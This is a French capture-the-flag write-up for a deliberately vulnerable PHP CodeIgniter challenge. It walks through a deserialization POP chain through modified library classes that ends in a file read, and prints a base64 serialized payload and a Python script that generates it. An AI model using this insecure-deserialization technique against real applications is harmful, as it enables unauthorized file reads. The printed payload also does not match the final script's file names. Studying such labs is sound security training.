## Résumé
Le chall consiste à trouver la popchain qui permettra de lire le flag à la racine du serveur.

- Les joueurs ont accès au code source
- Le `unserialize()` qui permet d'exécuter la popchain est directement sur la page d'accueil.
- Il y a volontairement beaucoup de fichiers pour forcer les joueurs à trouver les fichiers qui peuvent être intéressants. L'utilisation d'un IDE (vscode, phpstorm, ...) est donc fortement recommandée pour naviguer entre toutes les classes.

## Solution
```
TzoyNzoiRG9jdHJpbmVcQ29tbW9uXExleGVyXFRva2VuIjoxOntzOjg6ImNhbGxhYmxlIjthOjE6e2k6MDtPOjE1OiJHdXp6bGVIdHRwXFBvb2wiOjE6e3M6ODoicGFzc3dvcmQiO2E6MTp7aTowO086NDM6IlN5bWZvbnlcUG9seWZpbGxcSW50bFxOb3JtYWxpemVyXE5vcm1hbGl6ZXIiOjI6e3M6ODoiZmlsZW5hbWUiO3M6MTc6Ii4uLy4uLy4uL2ZsYWcudHh0IjtzOjE2OiJhdXRob3JpemVkX2ZpbGVzIjthOjE6e2k6MDtzOjE3OiIuLi8uLi8uLi9mbGFnLnR4dCI7fX19fX19
```
Soit, quand on décode en **base64**:

```
O:27:"Doctrine\Common\Lexer\Token":1:{s:8:"callable";a:1:{i:0;O:15:"GuzzleHttp\Pool":1:{s:8:"password";a:1:{i:0;O:43:"Symfony\Polyfill\Intl\Normalizer\Normalizer":2:{s:8:"filename";s:17:"../../../flag.txt";s:16:"authorized_files";a:1:{i:0;s:17:"../../../flag.txt";}}}}}}
```

## Explication de la solution
Quand on arrive sur la page d'accueil du challenge, il n'y a qu'un seul champ qui demande d'entrer son adresse mail. On peut alors récupérer les sources du challenge et les ouvrir dans un IDE.

On remarque d'abord qu'il y a de nombreux fichiers. Le chall utilise le framework PHP CodeIgniter. De nombreuses librairies sont également installées dans `application/vendor/`. Il y a donc beaucoup de code et il faut d'abord comprendre comment fonctionne l'application et quel code est, ou peut être, exécuté.

On trouve que le code de la page d'accueil se situe dans le fichier `application/views/home.php`. On peut envoyer un mail via `$_POST[]` et on remarque alors que le mail est base64 décodé puis désérialisé. La désérialisation de données non vérifiées est extrêment dangereuse en php car elle permet l'instanciation d'objets en contrôlant leurs attributs. Il faut maintenant trouver une popchain, c'est à dire un ensemble de classes php vulnérables jusqu'à arriver à une lecture de fichiers.

Quand un objet est désérialisé, la méthode magique `__wakeup()` de sa classe est appelée si elle est implémentée. Le code de la fonction est alors exécuté. De même, lorsque la désérialisation se termine, la méthode magique `__destruct()` est appelée sur l'objet si celle-ci elle implémentée. On commence donc par chercher si ces 2 méthodes sont présentes dans l'ensemble des fichiers.

On trouve un `__wakeup()` dans la classe `FnStream`, mais celui-ci ne semble pas exploitable car il rejette directement une exception. On cherche alors les `__destruct()`. On obtient 9 résultats. Un résultat semble intéressant avec `call_user_func` mais il est dans la classe `FnStream` qui, comme on l'a vu, n'est pas désérialisable. 

Cependant, on remarque un 2eme résultat intéressant dans `application/vendor/doctrine/lexer/src/Token.php`. On peut appeler la méthode `funny_func()` d'une classe. On regarde alors si une telle méthode existe et on trouve un seul résulat dans `application/vendor/guzzlehttp/guzzle/src/Pool.php`. Dans cette méthode, on voit un `echo 'Funny information: '.$password;`. Cela semble très intéressant (rapport au nom du chall). On a notre point d'entrée !

On peut commencer à créer notre objet sérialisé directement avec php, ou comme ici avec la librairie python `phpserialize`.

```python
from phpserialize import phpobject, serialize

pool = phpobject("GuzzleHttp\Pool")

token = phpobject("Doctrine\Common\Lexer\Token",{
    "callable": [pool]
})

serialized_object = serialize(token)
print(f"Objet sérialisé:\n{serialized_object.decode()}\n")
```

On a créé un objet de la classe `Token` qui a un attribut `callable` qui est un tableau qui contient lui même un objet de la classe `Pool`.

Regardons maintenant plus en détails la fonction `funny_func()` de cette classe `Pool`. 
```php
public function funny_func(){
    $password = '';
    foreach ($this->password as $letter){
        $password .= $letter;
    }
    echo 'Funny information: '.$password;
}
```
La seule donnée que l'on maîtrise ici est `$this->password`. Mais rien d'intéressant semble se passer, on itère juste sur chaque lettre et affiche le mot de passe. Cepandant, si l'on essaye de concaténer un objet à une chaine de caractères, la méthode magique `__toString()` est appelé sur cet objet pour obtenir sa représentation textuelle.

Et ici, `$this->password` est en réalité un tableau et non une chaîne de caractères comme les noms laissaient suggérer. Donc, on peut fournir un objet et sa méthode `__toString()` sera appelée si elle existe. On cherche donc les classes qui implémentent cette méthode. On obtient 11 résultats.

Un seul de ces résultats saute aux yeux, car il appelle une fonction `read_file()`, ce qui est exactement ce qu'on cherche ici. Si l'on regarde le code de cette fonction, on voit qu'il suffit de spécifier un nom de fichier mais également une liste de fichiers autorisés, pour lire le contenu de n'importe quel fichier.

```php
private function read_file(): string
{
    if(!in_array($this->filename, $this->authorized_files,true)) {
        return "Not authorized to access file " . $this->filename;
    }
    if (!file_exists($this->filename)){
        return "File ".$this->filename." does not exists";
    }
    return file_get_contents($this->filename);
}
```

Il ne nous reste plus qu'à compléter notre script python puis à tester pour voir le comportement du site.

```python
from phpserialize import phpobject, serialize
from base64 import b64encode

normalizer = phpobject("Symfony\Polyfill\Intl\\Normalizer\\Normalizer",{
    "filename": "flag.txt",
    "authorized_files": ["flag.txt"]
})

pool = phpobject("GuzzleHttp\Pool",{
    "password": [normalizer]
})

token = phpobject("Doctrine\Common\Lexer\Token",{
    "callable": [pool]
})

serialized_object = serialize(token)

print(f"Objet sérialisé:\n{serialized_object.decode()}\n")
print(f"Base64:\n{b64encode(serialized_object).decode()}")
```

On obtient:
```
TzoyNzoiRG9jdHJpbmVcQ29tbW9uXExleGVyXFRva2VuIjoxOntzOjg6ImNhbGxhYmxlIjthOjE6e2k6MDtPOjE1OiJHdXp6bGVIdHRwXFBvb2wiOjE6e3M6ODoicGFzc3dvcmQiO2E6MTp7aTowO086NDM6IlN5bWZvbnlcUG9seWZpbGxcSW50bFxOb3JtYWxpemVyXE5vcm1hbGl6ZXIiOjI6e3M6ODoiZmlsZW5hbWUiO3M6MTc6Ii4uLy4uLy4uL2ZsYWcudHh0IjtzOjE2OiJhdXRob3JpemVkX2ZpbGVzIjthOjE6e2k6MDtzOjE3OiIuLi8uLi8uLi9mbGFnLnR4dCI7fX19fX19
```
Soit, quand on décode en **base64**:
```
O:27:"Doctrine\Common\Lexer\Token":1:{s:8:"callable";a:1:{i:0;O:15:"GuzzleHttp\Pool":1:{s:8:"password";a:1:{i:0;O:43:"Symfony\Polyfill\Intl\Normalizer\Normalizer":2:{s:8:"filename";s:17:"../../../flag.txt";s:16:"authorized_files";a:1:{i:0;s:17:"../../../flag.txt";}}}}}}
```

Et quand on lance la désérialisation via $_POST['mail'], on obtient:
```
Funny information: FLAG={FAKE_FLAG}
```

Le tour est joué :)
